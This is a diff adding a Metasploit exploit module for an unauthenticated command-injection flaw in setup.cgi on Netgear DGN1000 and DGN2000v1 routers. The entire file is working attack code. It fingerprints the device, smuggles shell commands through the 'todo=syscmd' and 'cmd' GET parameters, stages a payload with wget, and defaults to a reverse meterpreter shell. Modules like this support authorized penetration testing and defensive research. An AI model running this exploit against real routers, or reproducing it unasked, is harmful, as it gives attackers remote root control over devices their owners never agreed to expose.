@@ -1,0 +1,103 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Netgear DGN1000 Setup.cgi Unauthenticated RCE',
+        'Description' => %q{
+          This module exploits an unauthenticated OS command execution vulneralbility
+          in the setup.cgi file in Netgear DGN1000 firmware versions up to 1.1.00.48, and
+          DGN2000v1 models.
+        },
+        'Author' => [
+          'Mumbai', # https://github.com/realoriginal (module)
+          'Robort Palerie <roberto@greyhats.it>' # vuln discovery
+        ],
+        'References' => [
+          ['CVE', '2024-12847'],
+          ['EDB', '25978'],
+        ],
+        'DisclosureDate' => '2013-06-05',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSBE,
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'
+        },
+        'Privileged' => true,
+        'Payload' => {
+          'DisableNops' => true,
+        },
+        'Targets' => [[ 'Automatic', {} ]],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri' => '/setup.cgi',
+        'method' => 'GET'
+      })
+      if res && res.headers['WWW-Authenticate']
+        auth = res.headers['WWW-Authenticate']
+        if auth =~ /DGN1000/
+          return Exploit::CheckCode::Detected('The target service was detected')
+        end
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown('Could not determine the target status')
+    end
+    Exploit::CheckCode::Unknown('Could not determine the target status')
+  end
+
+  def exploit
+    print_status("#{peer} - Connecting to target...")
+
+    unless check == Exploit::CheckCode::Detected
+      fail_with(Failure::Unknown, "#{peer} - Failed to access vulnerable URL")
+    end
+
+    print_status("#{peer} - Exploiting target ....")
+    execute_cmdstager(
+      :flavor => :wget,
+      :linemax => 200,
+      :concat_operator => " && "
+    )
+  end
+
+  def execute_command(cmd, opts)
+    begin
+      res = send_request_cgi({
+        'uri' => '/setup.cgi',
+        'method' => 'GET',
+        'vars_get' => {
+          'next_file' => 'netgear.cfg',
+          'todo' => 'syscmd',
+          'cmd' => cmd.to_s,
+          'curpath' => '/',
+          'currentsetting.htm' => '1'
+        }
+      })
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
